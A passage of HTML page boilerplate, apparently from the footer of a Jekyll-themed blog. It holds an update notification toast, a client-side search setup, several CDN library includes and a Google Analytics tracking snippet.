data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script async src="https://cdn.jsdelivr.net/npm/countup.js@1.9.3/dist/countUp.min.js"></script> <script defer src="/assets/js/dist/pvreport.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-WXLRG68JVE"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-WXLRG68JVE'); }); </script>
